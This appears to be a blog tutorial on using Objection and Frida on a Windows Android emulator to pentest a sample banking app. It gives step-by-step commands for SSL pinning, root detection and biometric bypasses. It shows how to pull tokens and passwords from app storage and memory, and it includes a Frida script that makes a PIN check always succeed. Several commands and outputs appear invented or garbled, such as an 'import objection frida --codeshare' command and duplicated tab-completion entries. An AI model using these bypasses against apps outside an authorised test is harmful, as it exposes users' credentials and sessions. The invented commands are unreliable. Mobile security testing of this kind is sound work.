---
title: "Objection: Zero to Expert — Complete Guide for Windows + Android Studio"
date: 2026-04-21 14:15:00 +0200
categories: [Mobile Security, Penetration Testing]
tags: [objection, frida, android, windows, android-studio, ssl-pinning, root-bypass, hooking, runtime-analysis, mobile-pentest]
description: "Everything about Objection — installation on Windows, Android Studio emulator setup, Frida server configuration, all commands, and real-world exploitation scenarios from zero to expert."
pin: false
math: false
mermaid: false
---

> This guide is **Windows-only**. Every command runs in **PowerShell** or **Command Prompt**. No Linux, no WSL. The emulator used is **Android Studio AVD** running on Windows.
{: .prompt-warning }

> Before you start: Objection is a **runtime mobile exploration toolkit** built on top of Frida. Understanding what Frida is will make everything here 10x easier — Frida is the engine, Objection is the cockpit.
{: .prompt-info }

---

## What Is Objection?

> **Analogy**: Think of Objection as a Swiss Army knife that attaches itself to a running Android app. While the app is live on your emulator, Objection lets you peel back every layer — read files, dump memory, bypass security checks, hook methods, and explore everything — all from a simple command line, without writing a single line of Frida JavaScript.
{: .prompt-tip }

Objection is a runtime mobile exploration toolkit powered by Frida. It gives you an interactive command shell that can:

```
┌──────────────────────────────────────────────────────────────────┐
│                  WHAT OBJECTION CAN DO                           │
├──────────────────────────────────────────────────────────────────┤
│  Security Bypasses       │  SSL Pinning, Root Detection,         │
│                          │  Biometric Authentication             │
│  Filesystem Access       │  Browse, read, write, download        │
│                          │  any file the app can access          │
│  Memory Analysis         │  Heap search, class instances,        │
│                          │  live object inspection               │
│  Runtime Hooking         │  Intercept any Java method,           │
│                          │  change return values, log args       │
│  Data Extraction         │  SharedPreferences, SQLite DBs,       │
│                          │  KeyStore, Clipboard                  │
│  Intent Launching        │  Start any Activity/Service           │
│  HTTP Monitoring         │  See all network calls live           │
│  App Intelligence        │  List classes, methods, activities    │
└──────────────────────────────────────────────────────────────────┘
```

---

## Version Requirements

> These versions are tested together and work reliably on Windows with Android Studio. Do NOT mix versions — a mismatch between Frida Python library and frida-server binary is the #1 cause of errors.
{: .prompt-warning }

```
┌────────────────────────────────────────────────────────────────┐
│              RECOMMENDED VERSION STACK                         │
├───────────────────────────┬────────────────────────────────────┤
│  Tool                     │  Version                           │
├───────────────────────────┼────────────────────────────────────┤
│  Objection                │  1.11.0  (latest stable)           │
│  Frida Python (pip)       │  16.5.9  (must match server)       │
│  frida-tools (pip)        │  12.5.0  (companion tools)         │
│  frida-server binary      │  16.5.9  (MUST match pip version)  │
│  Python (Windows)         │  3.11.x  or  3.12.x               │
│  Android Studio           │  Hedgehog 2023.1.1+ / Iguana+      │
│  Android API Level        │  29  (Android 10)  ← BEST          │
│  Android Architecture     │  x86_64  (for modern PCs)         │
│  AVD Image Type           │  Google APIs  (NOT Google Play)    │
└───────────────────────────┴────────────────────────────────────┘
```

### Why API 29 (Android 10)?

```
┌─────────────────────────────────────────────────────────────────┐
│               API LEVEL COMPARISON FOR FRIDA/OBJECTION          │
├──────────┬──────────────┬────────────────────────────────────── │
│ API      │ Android Ver  │ Notes                                  │
├──────────┼──────────────┼───────────────────────────────────────┤
│ 28       │ Android 9    │ OK — slightly older but works          │
│ 29  ★    │ Android 10   │ BEST — stable, full root, no issues   │
│ 30  ★    │ Android 11   │ GOOD — some extra SELinux tweaks       │
│ 31-32    │ Android 12   │ OK — occasional frida-server issues    │
│ 33       │ Android 13   │ OK — works but more setup needed       │
│ 34       │ Android 14   │ HARDER — SELinux blocks some things   │
│ 35       │ Android 15   │ ADVANCED — significant restrictions    │
└──────────┴──────────────┴───────────────────────────────────────┘
★ = Recommended for beginners and most pentest work
```

> Always use a **Google APIs** image, NOT a **Google Play** image. Google Play images are restricted — frida-server cannot run as root on them.
{: .prompt-warning }

---

## Environment Setup on Windows

### Step 1 — Install Python 3.11

```powershell
# Download Python 3.11 from python.org
# https://www.python.org/downloads/release/python-3119/

# After installation, verify in PowerShell:
python --version
```
```
Python 3.11.9
```

```powershell
# Upgrade pip
python -m pip install --upgrade pip
```
```
Successfully installed pip-24.0
```

### Step 2 — Install Android Studio

Download Android Studio from: `https://developer.android.com/studio`

After installation:

```powershell
# Add ADB and platform-tools to your PATH
# Android SDK is usually at: C:\Users\<YourName>\AppData\Local\Android\Sdk

# Add to PATH via PowerShell (permanent):
$sdkPath = "$env:LOCALAPPDATA\Android\Sdk\platform-tools"
$currentPath = [System.Environment]::GetEnvironmentVariable("Path","User")
[System.Environment]::SetEnvironmentVariable("Path", "$currentPath;$sdkPath", "User")

# Reload the session
$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")

# Verify
adb version
```
```
Android Debug Bridge version 1.0.41
Version 34.0.5-10900879
Installed as C:\Users\Student\AppData\Local\Android\Sdk\platform-tools\adb.exe
```

### Step 3 — Create the Android Virtual Device (AVD)

Open Android Studio → Tools → Device Manager → Create Virtual Device

```
┌──────────────────────────────────────────────────────────────────┐
│              AVD CONFIGURATION — EXACT SETTINGS                  │
├──────────────────────┬───────────────────────────────────────────┤
│  Category            │  Value                                    │
├──────────────────────┼───────────────────────────────────────────┤
│  Device              │  Pixel 6  (or any phone profile)          │
│  System Image        │  API 29  (Android 10.0)                   │
│  Image Type          │  Google APIs  ← CRITICAL (not Play Store) │
│  ABI / Architecture  │  x86_64                                   │
│  RAM                 │  2048 MB minimum                          │
│  VM Heap             │  512 MB                                   │
│  Internal Storage    │  2048 MB                                  │
│  SD Card             │  512 MB                                   │
│  Graphics            │  Hardware - GLES 2.0                      │
│  Cold Boot           │  Enabled (more reliable for frida)        │
└──────────────────────┴───────────────────────────────────────────┘
```

> Make sure you select **x86_64** not x86 or arm. x86_64 images run much faster with hardware acceleration (Intel HAXM or Windows Hypervisor Platform).
{: .prompt-tip }

### Step 4 — Enable Windows Hypervisor Platform (WHPX)

```powershell
# Enable WHPX for fast emulation (run as Administrator)
dism /online /enable-feature /featurename:HypervisorPlatform /all /norestart

# Restart Windows after this command
Restart-Computer
```

### Step 5 — Start the Emulator

```powershell
# Find emulator path
$emulatorPath = "$env:LOCALAPPDATA\Android\Sdk\emulator"

# List available AVDs
& "$emulatorPath\emulator.exe" -list-avds
```
```
Pixel_6_API_29
```

```powershell
# Start emulator (keep this PowerShell window open)
& "$emulatorPath\emulator.exe" -avd Pixel_6_API_29 -writable-system -no-snapshot-load
```
```
INFO    | Android emulator version 34.1.20.0 (build_id 11311094)
INFO    | Found HAXM
INFO    | Booting emulator with: Pixel_6_API_29
...
```

> The `-writable-system` flag is important — it allows writing to the system partition which is needed for some Frida operations.
{: .prompt-tip }

### Step 6 — Verify Emulator is Running

```powershell
# In a new PowerShell window:
adb devices
```
```
List of devices attached
emulator-5554   device
```

```powershell
# Get a shell into the emulator
adb shell whoami
```
```
root
```

> If you see `root`, you are ready to proceed. If you see `shell`, your image may be a Google Play image — you need to switch to a Google APIs image.
{: .prompt-warning }

---

## Installing Frida and Objection

### Step 1 — Install Frida Python Library

```powershell
# Install exact matching versions (CRITICAL — must match frida-server version)
pip install frida==16.5.9
pip install frida-tools==12.5.0
pip install objection==1.11.0
```
```
Collecting frida==16.5.9
  Downloading frida-16.5.9-cp311-cp311-win_amd64.whl (5.4 MB)
Installing collected packages: frida
Successfully installed frida-16.5.9

Collecting frida-tools==12.5.0
  Downloading frida_tools-12.5.0-py3-none-any.whl
Successfully installed frida-tools-12.5.0

Collecting objection==1.11.0
  Downloading objection-1.11.0-py3-none-any.whl
Successfully installed objection-1.11.0
```

```powershell
# Verify all installations
python -c "import frida; print('Frida:', frida.__version__)"
objection version
frida --version
```
```
Frida: 16.5.9
objection: 1.11.0
16.5.9
```

> All three version numbers must match or be compatible. The most critical requirement is that the **frida Python library version** (16.5.9) **exactly matches** the **frida-server binary version** you push to the emulator.
{: .prompt-warning }

### Step 2 — Download frida-server Binary

```powershell
# Create working directory
New-Item -ItemType Directory -Path "C:\pentest\mobile" -Force
Set-Location "C:\pentest\mobile"

# Download frida-server for Android x86_64 (matches emulator architecture)
# URL pattern: https://github.com/frida/frida/releases/download/<version>/frida-server-<version>-android-x86_64.xz
$fridaVersion = "16.5.9"
$url = "https://github.com/frida/frida/releases/download/$fridaVersion/frida-server-$fridaVersion-android-x86_64.xz"

Invoke-WebRequest -Uri $url -OutFile "frida-server-$fridaVersion-android-x86_64.xz"
```
```
StatusCode: 200
Content Length: 6.2 MB downloaded
```

```powershell
# Extract the .xz file
# Option 1: Use 7-Zip (install from 7-zip.org)
& "C:\Program Files\7-Zip\7z.exe" e "frida-server-16.5.9-android-x86_64.xz"

# Option 2: Use tar (available in Windows 10+)
tar -xf "frida-server-16.5.9-android-x86_64.xz"

# Rename for convenience
Rename-Item "frida-server-16.5.9-android-x86_64" "frida-server"

# Verify the binary exists
Get-Item "frida-server"
```
```
    Directory: C:\pentest\mobile

Mode                 LastWriteTime         Length Name
----                 -------------         ------
-a----         21/04/2026    14:20       10485760 frida-server
```

### Step 3 — Push frida-server to Emulator

```powershell
# Push binary to emulator's temp directory
adb push "C:\pentest\mobile\frida-server" "/data/local/tmp/frida-server"
```
```
C:\pentest\mobile\frida-server: 1 file pushed, 0 skipped. 52.4 MB/s (10485760 bytes in 0.191s)
```

```powershell
# Set executable permission
adb shell chmod 755 /data/local/tmp/frida-server

# Verify it's there and executable
adb shell ls -la /data/local/tmp/frida-server
```
```
-rwxr-xr-x 1 root root 10485760 2026-04-21 14:21 /data/local/tmp/frida-server
```

### Step 4 — Start frida-server on Emulator

```powershell
# Start frida-server in the background on the emulator
# This runs it as root (since our Google APIs image gives root)
adb shell "/data/local/tmp/frida-server &"
```

> Open a **dedicated PowerShell window** just for this — leave it open while you work. The frida-server process needs to stay running.
{: .prompt-tip }

```powershell
# Verify frida-server is running
adb shell "ps | grep frida"
```
```
root          3847     1 10617644 29452 poll_schedule_timeout 0 S frida-server
```

### Step 5 — Verify Frida Connection from Windows

```powershell
# List running processes on the emulator via Frida
frida-ps -U
```
```
 PID  Name
----  --------------------------------------------
  1   init
 ...
1234  com.android.systemui
5678  com.example.vulnerable_app
9012  com.google.android.gms
```

```powershell
# List only installed apps (not system processes)
frida-ps -Ua
```
```
 PID  Name                  Identifier
----  --------------------  ----------------------------------
5678  Vulnerable Banking    com.example.vulnerable_app
9012  Google Play Services  com.google.android.gms
```

> If you see your apps listed here, **Frida is working perfectly** and you are ready to use Objection.
{: .prompt-tip }

---

## Connecting Objection to a Target App

### Method 1 — Attach to Running App (Most Common)

```powershell
# First, launch the app on the emulator manually
# Then attach Objection to it

objection -g com.example.vulnerable_app explore
```
```
     _   _         _   _
 ___| |_|_|___ ___| |_|_|___ ___
| . | . | | -_|  _|  _| | . |   |
|___|___|_| |___|___|_| |_|___|_|_|
          |___|           v1.11.0

     Runtime Mobile Exploration
        by: @leonjza from @nowsecure

[tab] for command suggestions

com.example.vulnerable_app on (Android: 10) [usb] #
```

### Method 2 — Spawn the App (Starts Fresh)

```powershell
# Spawn = Objection starts the app and attaches at the very beginning
# Useful when you need to hook early initialization code
objection -g com.example.vulnerable_app explore --startup-command "android sslpinning disable"
```
```
[*] Spawning com.example.vulnerable_app...
[*] Injecting agent...
[*] Executing startup command: android sslpinning disable
[+] SSL Pinning bypass script enabled
[*] Resuming app...

com.example.vulnerable_app on (Android: 10) [usb] #
```

### Method 3 — Specific Process by PID

```powershell
# Get the PID first
frida-ps -Ua | findstr "vulnerable"
```
```
5678  Vulnerable Banking  com.example.vulnerable_app
```

```powershell
# Attach by PID
objection -g 5678 explore
```

> **Attach vs Spawn**: Use **attach** for most tests. Use **spawn** when you need to intercept initialization — for example, if SSL pinning is set up before the first screen shows, you need spawn to catch it early.
{: .prompt-info }

---

## Navigating the Objection Shell

Once inside, you see a prompt like this:

```
com.example.vulnerable_app on (Android: 10) [usb] #
```

This tells you:
- `com.example.vulnerable_app` — the package you are attached to
- `(Android: 10)` — Android version on device
- `[usb]` — connected via USB/ADB
- `#` — ready for commands

```powershell
# TAB completion works! Press TAB after any partial command
# For example, type "android " then press TAB:

com.example.vulnerable_app on (Android: 10) [usb] # android [TAB]
```
```
android clipboard               android hooking
android deobfuscate             android intent
android filesystem              android keystore
android heap                    android proxy
android httpclient              android root
android intent                  android screenshot
android shell_exec              android sslpinning
android ui                      android ui
```

```powershell
# Get help for any command
com.example.vulnerable_app on (Android: 10) [usb] # android sslpinning --help
```
```
android sslpinning disable [--quiet]
android sslpinning disable --quiet

Attempt to disable SSL pinning in the current application.
```

---

## Filesystem Exploration

> **Analogy**: The filesystem commands in Objection work exactly like a file browser, except you are browsing files from inside the app's own sandbox — files other apps cannot see.
{: .prompt-tip }

### Browse App Files

```powershell
# List the app's private data directory
com.example.vulnerable_app on (Android: 10) [usb] # android filesystem ls /data/data/com.example.vulnerable_app/
```
```
Type    Last Modified                Size  Name
------  ---------------------------  ----  -------------------------
d       2026:04:21 10:00:00 +0000        0  cache
d       2026:04:21 10:00:00 +0000        0  code_cache
d       2026:04:21 10:05:12 +0000        0  databases
d       2026:04:21 10:05:12 +0000        0  files
d       2026:04:21 09:59:55 +0000        0  shared_prefs
```

```powershell
# List shared preferences (where apps often store tokens and settings)
com.example.vulnerable_app on (Android: 10) [usb] # android filesystem ls /data/data/com.example.vulnerable_app/shared_prefs/
```
```
Type    Last Modified                Size  Name
------  ---------------------------  ----  -------------------------
f       2026:04:21 10:05:18 +0000    1024  user_prefs.xml
f       2026:04:21 10:05:18 +0000    2048  session_data.xml
f       2026:04:21 10:05:18 +0000     512  app_settings.xml
```

```powershell
# Read a file directly
com.example.vulnerable_app on (Android: 10) [usb] # android filesystem cat /data/data/com.example.vulnerable_app/shared_prefs/session_data.xml
```
```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="auth_token">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI0MiIsInJvbGUiOiJhZG1pbiJ9.abc123</string>
    <string name="user_email">john.doe@bank.com</string>
    <string name="session_id">sess_abc123def456</string>
    <boolean name="remember_me" value="true" />
    <string name="last_pin">1234</string>
</map>
```

```powershell
# List the databases directory
com.example.vulnerable_app on (Android: 10) [usb] # android filesystem ls /data/data/com.example.vulnerable_app/databases/
```
```
Type  Last Modified                Size      Name
----  ---------------------------  --------  -------------------
f     2026:04:21 10:05:30 +0000    32768     app_database.db
f     2026:04:21 10:05:30 +0000     4096     app_database.db-shm
f     2026:04:21 10:05:30 +0000    16384     app_database.db-wal
f     2026:04:21 10:05:20 +0000     8192     sessions.db
```

### Download Files to Windows

```powershell
# Download a database file to your Windows machine
com.example.vulnerable_app on (Android: 10) [usb] # android filesystem download /data/data/com.example.vulnerable_app/databases/app_database.db
```
```
Downloading /data/data/com.example.vulnerable_app/databases/app_database.db to app_database.db
[*] Downloading...
[+] Saved to: C:\pentest\mobile\app_database.db  (32768 bytes)
```

```powershell
# Now open the downloaded DB with SQLite browser (install from sqlitebrowser.org)
# Or use sqlite3.exe:
sqlite3 app_database.db ".tables"
```
```
accounts    sessions    transactions    users
```

```powershell
sqlite3 app_database.db "SELECT id, username, email, password_hash FROM users;"
```
```
1|admin|admin@bank.com|$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewdBPj0kg/n4FKyq
2|john.doe|john.doe@bank.com|$2b$12$eImiTXuWVxfM/ILFviqxnuM0mAIBH6fRCzFECOHrfNV5VC0B1eX9W
3|jane.smith|jane.smith@bank.com|$2b$12$WFezQPn3TvopVuGPVU2BGumcWZMFHIgH.L2Rf2cFW.1iREX0OKIOW
```

### Upload Files to Device

```powershell
# Upload a file to the emulator
com.example.vulnerable_app on (Android: 10) [usb] # android filesystem upload C:\pentest\mobile\payload.txt /data/local/tmp/payload.txt
```
```
[*] Uploading C:\pentest\mobile\payload.txt to /data/local/tmp/payload.txt
[+] Upload complete!
```

---

## Reading SharedPreferences

```powershell
# List all SharedPreferences files
com.example.vulnerable_app on (Android: 10) [usb] # android sharedpreferences list
```
```
[*] SharedPreferences files found:

user_prefs
session_data
app_settings
```

```powershell
# Read a specific SharedPreferences file
com.example.vulnerable_app on (Android: 10) [usb] # android sharedpreferences read user_prefs
```
```
[*] Reading SharedPreferences: user_prefs

Key                   Type     Value
--------------------  -------  --------------------------------------------------
username              String   john.doe@bank.com
password              String   MyBankP@ss2024            <-- Stored in cleartext!
api_key               String   sk_live_4eC39HqLyjWD...
is_logged_in          Boolean  true
user_id               Integer  42
device_token          String   fcm_token_abc123def456
biometric_enabled     Boolean  true
last_login            Long     1713700800000
```

> Finding passwords stored in SharedPreferences is a very common finding in mobile app pentests. It is a direct vulnerability — apps should never store credentials in cleartext.
{: .prompt-warning }

---

## SSL Pinning Bypass

> **Analogy**: SSL pinning is like a bouncer who only lets in people with a specific face. apk-mitm changes the app to remove the bouncer. Objection goes further — it bribes the bouncer while the app is running, without touching the APK.
{: .prompt-tip }

### Understanding SSL Pinning

```
┌──────────────────────────────────────────────────────────────────┐
│                 WHY SSL PINNING BLOCKS YOU                       │
│                                                                  │
│  WITHOUT Pinning:                                                │
│  App → Burp CA cert accepted → Burp intercepts → Server         │
│                                                                  │
│  WITH Pinning:                                                   │
│  App → Checks cert against hardcoded hash → NOT Burp cert       │
│       → CONNECTION REFUSED                                       │
│                                                                  │
│  WITH Objection Bypass:                                          │
│  App → Objection hooks TrustManager/CertificatePinner           │
│       → Bypass check → Burp cert accepted → Burp intercepts     │
└──────────────────────────────────────────────────────────────────┘
```

### Bypass SSL Pinning

```powershell
# The most important Objection command — single line to bypass SSL pinning
com.example.vulnerable_app on (Android: 10) [usb] # android sslpinning disable
```
```
Job: 3582ee4b-3e1f-4f23-b0ab-42d3fcb5a0c7 - Starting
[*] Hooking com.android.org.conscrypt.TrustManagerImpl.checkTrustedRecursive()
[*] Hooking com.android.org.conscrypt.TrustManagerImpl.verifyChain()
[*] Hooking javax.net.ssl.TrustManager (all implementations)
[*] Hooking okhttp3.CertificatePinner.check()
[*] Hooking okhttp3.CertificatePinner.check$okhttp()
[*] Hooking com.squareup.okhttp.CertificatePinner.check()
[*] Hooking javax.net.ssl.HttpsURLConnection.setSSLSocketFactory()
[*] Hooking javax.net.ssl.SSLContext.init()
[+] SSL Pinning bypass complete! Job: 3582ee4b
```

### Configure Burp Suite Proxy (Windows)

```powershell
# In Burp Suite:
# 1. Proxy → Options → Add listener: 0.0.0.0:8080
# 2. Export CA cert: Proxy → Options → Export CA Certificate → DER format
# Save as: C:\pentest\mobile\burp_ca.der

# Convert to PEM format (if needed)
# Install OpenSSL for Windows from: https://slproweb.com/products/Win32OpenSSL.html
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" x509 -inform DER -outform PEM -in burp_ca.der -out burp_ca.pem
```

```powershell
# Push Burp CA cert to emulator
adb push C:\pentest\mobile\burp_ca.der /data/local/tmp/burp_ca.der

# Install cert as system-trusted (requires root/writable-system)
adb shell

# Inside adb shell:
# Convert DER to system cert format
openssl x509 -inform DER -subject_hash_old -in /data/local/tmp/burp_ca.der | head -1
# Example output: 9a5ba580

# Copy to system certs with the hash filename
cp /data/local/tmp/burp_ca.der /system/etc/security/cacerts/9a5ba580.0
chmod 644 /system/etc/security/cacerts/9a5ba580.0

# Exit adb shell
exit
```

```powershell
# Set Android emulator to use Burp as proxy
adb shell settings put global http_proxy 192.168.1.100:8080
# Replace 192.168.1.100 with your Windows machine's IP
```

### Verifying SSL Bypass Works

After disabling pinning, trigger network requests in the app. You should see them in Burp:

```
POST /api/v2/auth/login HTTP/1.1
Host: api.bank.com
Content-Type: application/json
Authorization: Bearer null

{"username":"john.doe@bank.com","password":"MyBankP@ss2024","deviceId":"emulator-5554"}

HTTP/1.1 200 OK
Content-Type: application/json

{"token":"eyJhbGciOiJIUzI1NiJ9...","userId":42,"role":"admin"}
```

### Bypass at App Startup (Spawn Mode)

```powershell
# For apps where pinning is set up before first screen loads,
# use spawn so bypass happens before any network call
objection -g com.example.vulnerable_app explore --startup-command "android sslpinning disable"
```
```
[*] Spawning com.example.vulnerable_app...
[*] Injecting agent...
[*] SSL pinning disabled pre-app-start
[*] Resuming...
```

---

## Root Detection Bypass

### Why Apps Detect Root

```
┌──────────────────────────────────────────────────────────────────┐
│              HOW ROOT DETECTION WORKS                            │
│                                                                  │
│  App checks for:                                                 │
│  1. Presence of /system/app/Superuser.apk                        │
│  2. Presence of /sbin/su, /system/bin/su                         │
│  3. Build.TAGS contains "test-keys"                              │
│  4. Dangerous packages: com.koushikdutta.superuser               │
│  5. getprop ro.build.type == "userdebug"                         │
│  6. Checking if "su" binary executes without error               │
│                                                                  │
│  Objection hooks all these checks and returns "not rooted"       │
└──────────────────────────────────────────────────────────────────┘
```

```powershell
# Bypass root detection
com.example.vulnerable_app on (Android: 10) [usb] # android root disable
```
```
Job: 91a2b3c4 - Starting
[*] Hooking com.rootbeer.RootBeer.detectRootManagementApps()
[*] Hooking com.rootbeer.RootBeer.detectPotentiallyDangerousApps()
[*] Hooking com.rootbeer.RootBeer.checkSuExists()
[*] Hooking com.rootbeer.RootBeer.checkForSuBinary()
[*] Hooking com.rootbeer.RootBeer.checkForBusyBoxBinary()
[*] Hooking com.rootbeer.RootBeer.checkForMagiskBinary()
[*] Hooking com.rootbeer.RootBeer.isRooted()
[*] Hooking java.io.File.exists()  [filtered for root files]
[*] Hooking android.os.Build.TAGS  [returning: release-keys]
[+] Root bypass active! Job: 91a2b3c4
```

```powershell
# Also simulate non-root environment
com.example.vulnerable_app on (Android: 10) [usb] # android root simulate
```
```
[*] Simulating standard Android environment...
[*] Build.TAGS                  → "release-keys"
[*] Build.TYPE                  → "user"
[*] Build.FINGERPRINT           → non-debug fingerprint
[+] Simulation active
```

### Combining Both Bypasses

```powershell
# Most effective startup: bypass both at launch
objection -g com.example.vulnerable_app explore \
  --startup-command "android root disable; android sslpinning disable"
```

---

## Biometric Authentication Bypass

```powershell
# Bypass fingerprint / face authentication
com.example.vulnerable_app on (Android: 10) [usb] # android ui biometric_bypass enable
```
```
[*] Hooking androidx.biometric.BiometricPrompt
[*] Hooking android.hardware.biometrics.BiometricPrompt
[*] Hooking android.hardware.fingerprint.FingerprintManager
[*] Patching onAuthenticationSucceeded to auto-trigger...
[+] Biometric bypass enabled!

[*] When the biometric dialog appears, authentication will auto-succeed
    regardless of fingerprint/face scan.
```

---

## Exploring App Classes and Methods

> This section is where Objection becomes a powerful reverse engineering tool — you can explore every Java class in the app without needing jadx or decompilers.
{: .prompt-info }

### List Loaded Classes

```powershell
# List all Java classes currently loaded in the app's JVM
com.example.vulnerable_app on (Android: 10) [usb] # android hooking list classes
```
```
[*] Listing currently loaded classes...

com.example.vulnerable_app.MainActivity
com.example.vulnerable_app.LoginActivity
com.example.vulnerable_app.AdminPanelActivity
com.example.vulnerable_app.util.CryptoHelper
com.example.vulnerable_app.util.NetworkHelper
com.example.vulnerable_app.db.UserRepository
com.example.vulnerable_app.model.User
com.example.vulnerable_app.service.SyncService
...
[*] Found 847 classes
```

```powershell
# Search for a specific class by keyword
com.example.vulnerable_app on (Android: 10) [usb] # android hooking search classes crypto
```
```
com.example.vulnerable_app.util.CryptoHelper
com.example.vulnerable_app.security.PinCrypto
javax.crypto.Cipher
javax.crypto.SecretKey
javax.crypto.spec.SecretKeySpec
javax.crypto.spec.IvParameterSpec
```

### List Methods of a Class

```powershell
# See all methods in a class
com.example.vulnerable_app on (Android: 10) [usb] # android hooking list class_methods com.example.vulnerable_app.util.CryptoHelper
```
```
[*] Listing methods for: com.example.vulnerable_app.util.CryptoHelper

public static java.lang.String com.example.vulnerable_app.util.CryptoHelper.encrypt(java.lang.String)
public static java.lang.String com.example.vulnerable_app.util.CryptoHelper.decrypt(java.lang.String)
public static java.lang.String com.example.vulnerable_app.util.CryptoHelper.generateKey()
public static byte[] com.example.vulnerable_app.util.CryptoHelper.hashPassword(java.lang.String, byte[])
public static boolean com.example.vulnerable_app.util.CryptoHelper.verifyPin(java.lang.String, java.lang.String)
private static javax.crypto.SecretKey com.example.vulnerable_app.util.CryptoHelper.deriveKey(java.lang.String)
```

---

## Runtime Hooking — Intercepting Methods

> **Analogy**: Hooking a method is like wiretapping a phone call. The call still goes through, but you are secretly listening to everything being said — the arguments going in and the results coming out.
{: .prompt-tip }

### Watch a Method (Log All Calls)

```powershell
# Watch the encrypt method — log every call with arguments and return value
com.example.vulnerable_app on (Android: 10) [usb] # android hooking watch class_method com.example.vulnerable_app.util.CryptoHelper.encrypt --dump-args --dump-return
```
```
[*] Hooking com.example.vulnerable_app.util.CryptoHelper.encrypt()
[*] Watching method...

[Hook] com.example.vulnerable_app.util.CryptoHelper.encrypt()
  Called from: com.example.vulnerable_app.LoginActivity.onLoginButtonClick()
  Arguments:
    Argument 0 (String): {"username":"john.doe","password":"MyBankP@ss2024","device":"emulator"}
  Return Value: "7649abac8119b246cee98e9b12e9197d5086cb9b3cfd651d4dc8d7ea4b8327f5"

[Hook] com.example.vulnerable_app.util.CryptoHelper.encrypt()
  Called from: com.example.vulnerable_app.service.SyncService.buildPayload()
  Arguments:
    Argument 0 (String): {"userId":42,"balance":15000,"transactions":[...]}
  Return Value: "a3b4c5d6e7f8a1b2c3d4e5f6..."
```

### Watch an Entire Class

```powershell
# Hook ALL methods in a class at once
com.example.vulnerable_app on (Android: 10) [usb] # android hooking watch class com.example.vulnerable_app.util.CryptoHelper
```
```
[*] Hooking all 6 methods in CryptoHelper...
[+] encrypt             → watching (1 overload)
[+] decrypt             → watching (1 overload)
[+] generateKey         → watching (1 overload)
[+] hashPassword        → watching (1 overload)
[+] verifyPin           → watching (1 overload)
[+] deriveKey           → watching (1 overload)

--- Live output as app runs ---
[Hook] verifyPin("1234", "$2b$12$LQv3c1yqBWVH...") → true
[Hook] deriveKey("MyBankP@ss2024") → [SecretKey object]
[Hook] encrypt("{\"userId\":42,...}") → "7649abac..."
```

### Hook with Backtrace (Call Stack)

```powershell
# See exactly what called the method (full stack trace)
com.example.vulnerable_app on (Android: 10) [usb] # android hooking watch class_method com.example.vulnerable_app.util.CryptoHelper.encrypt --dump-args --dump-return --dump-backtrace
```
```
[Hook] CryptoHelper.encrypt()
  Arguments: "sensitive_data_here"
  Backtrace:
    com.example.vulnerable_app.util.CryptoHelper.encrypt(CryptoHelper.java:45)
    com.example.vulnerable_app.LoginActivity.submitLogin(LoginActivity.java:123)
    com.example.vulnerable_app.LoginActivity.onLoginButtonClick(LoginActivity.java:89)
    android.view.View.performClick(View.java:7352)
    android.view.View.performClickInternal(View.java:7318)
    android.view.View$PerformClick.run(View.java:28216)
```

### Modify Return Value (Change App Behavior)

```powershell
# Hook verifyPin and always return true (bypass PIN check)
# First, get into the Frida REPL mode from Objection
com.example.vulnerable_app on (Android: 10) [usb] # import objection frida --codeshare
```

Or use a custom Frida script with Objection's `--startup-script` flag:

```javascript
// save as: C:\pentest\mobile\bypass_pin.js
Java.perform(function() {
    var CryptoHelper = Java.use("com.example.vulnerable_app.util.CryptoHelper");

    CryptoHelper.verifyPin.implementation = function(inputPin, storedPin) {
        console.log("[HOOK] verifyPin called!");
        console.log("  Input PIN  : " + inputPin);
        console.log("  Stored PIN : " + storedPin);
        console.log("  -> Returning TRUE (bypassed)");
        return true;  // Always return true regardless of PIN
    };
});
```

```powershell
# Launch with the hook script
objection -g com.example.vulnerable_app explore --startup-script C:\pentest\mobile\bypass_pin.js
```
```
[*] Spawning com.example.vulnerable_app...
[*] Loading startup script: C:\pentest\mobile\bypass_pin.js
[*] Script loaded successfully
[*] Resuming app...

--- When PIN is entered ---
[HOOK] verifyPin called!
  Input PIN  : 9999
  Stored PIN : $2b$12$LQv3c1...
  -> Returning TRUE (bypassed)
[+] Unlocked with wrong PIN!
```

### Search for Methods Across All Classes

```powershell
# Find any method that contains "password" in its name
com.example.vulnerable_app on (Android: 10) [usb] # android hooking search methods password
```
```
[*] Searching all loaded classes for methods matching: password

com.example.vulnerable_app.util.CryptoHelper.hashPassword
com.example.vulnerable_app.ui.LoginActivity.onPasswordChanged
com.example.vulnerable_app.db.UserRepository.updatePassword
com.example.vulnerable_app.model.User.setPassword
com.example.vulnerable_app.model.User.getPassword
com.example.vulnerable_app.security.PasswordValidator.validate
```

---

## Heap Analysis — Inspect Live Objects

> **Analogy**: The heap is the app's working memory where all active objects live. Searching it is like emptying someone's desk while they're working — you find exactly what they're currently using.
{: .prompt-tip }

### Search Heap for Class Instances

```powershell
# Find all live instances of a class in memory
com.example.vulnerable_app on (Android: 10) [usb] # android heap search instances com.example.vulnerable_app.model.User
```
```
[*] Searching heap for instances of: com.example.vulnerable_app.model.User

[Instance 1]  Handle: 0x7f3a001234
[Instance 2]  Handle: 0x7f3a005678
[Instance 3]  Handle: 0x7f3a009abc

[*] Found 3 instance(s)
```

```powershell
# Execute a method on a live heap instance
com.example.vulnerable_app on (Android: 10) [usb] # android heap execute 0x7f3a001234 getEmail
```
```
[*] Executing getEmail() on handle 0x7f3a001234

Return Value: john.doe@bank.com
```

```powershell
# Get all field values of an instance
com.example.vulnerable_app on (Android: 10) [usb] # android heap evaluate 0x7f3a001234
```
```
[*] Evaluating instance at: 0x7f3a001234
[*] Class: com.example.vulnerable_app.model.User

Fields:
  id          (int)     : 42
  email       (String)  : john.doe@bank.com
  username    (String)  : john.doe
  password    (String)  : MyBankP@ss2024     <-- Stored in heap memory!
  authToken   (String)  : eyJhbGciOiJIUzI1NiJ9...
  isAdmin     (boolean) : false
  sessionId   (String)  : sess_abc123def456
```

### Print All Instances with Field Values

```powershell
# Print all instances of a class with their toString()
com.example.vulnerable_app on (Android: 10) [usb] # android heap print_instances com.example.vulnerable_app.model.User
```
```
[*] Printing all instances...

Instance 1:
  User{id=42, email='john.doe@bank.com', username='john.doe', isAdmin=false}

Instance 2:
